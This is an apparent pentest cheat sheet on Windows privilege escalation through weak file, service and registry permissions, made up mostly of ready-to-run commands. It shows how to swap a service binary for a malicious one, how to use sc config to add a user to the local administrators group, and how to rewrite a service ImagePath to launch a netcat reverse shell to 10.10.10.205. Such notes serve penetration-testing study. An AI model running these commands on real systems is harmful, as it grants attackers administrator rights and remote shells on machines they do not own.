# Weak Permissions


## Permissive File System ACLs
### SharpUp
https://github.com/GhostPack/SharpUp/
```powershell
.\SharpUp.exe audit
# This tool identifies the PC Security Management Service, which execute SecurityService.exe binary.
```
 ### icacls
```
icacls "C:\Program Files (x86)\PCProtect\SecurityService.exe"
https://ss64.com/nt/icacls.html
```
 ### Replacing Service Binary
```
# replace it with a malicious binary
cmd /c copy /Y Binary.exe "C:\Program Files (x86)\PCProtect\Binary.exe"
```
## Weak Service Permissions
### Checking Permissions with AccessChk
```
accesschk.exe /accepteula -quvcw ServiceName
```
### Check Local Admin Group
```
net localgroup administrators
```
### Changing the Service Binary Path
```
sc config ServiceName binpath="cmd /c net localgroup administrators UserName /add"
# stop and start it to start the nex one
sc stop ServiceName
sc start ServiceName
```
## Cleanup
### Reverting the Binary Path
```
sc config ServiceName binpath="c:\Program Files (x86)\PATH\Binary.exe"
```
### Verify if the Service is Running
```
sc query ServiceName
```
### Unquoted Service Path
```
When a service is installed, the registry configuration specifies a path to the binary that should be executed on service start. 
If this binary is not encapsulated within quotes, Windows will attempt to locate the binary in different folders. 
```
### Searching for Unquoted Service Paths
```
wmic service get name,displayname,pathname,startmode |findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """
```
## Permissive Registry ACLs
### Checking for Weak Service ACLs in Registry using accesschk
```
accesschk.exe /accepteula "mrb3n" -kvuqsw hklm\System\CurrentControlSet\services
```
### Changing ImagePath with PowerShell
We can abuse this using the PowerShell cmdlet Set-ItemProperty to change the ImagePath value, using a command such as:
```powershell
Set-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\ModelManagerService -Name "ImagePath" -Value "C:\Users\john\Downloads\nc.exe -e cmd.exe 10.10.10.205 443"
```
## Modifiable Registry Autorun Binary
### Check Startup Programs
```powershell
Get-CimInstance Win32_StartupCommand | select Name, command, Location, User |fl
```









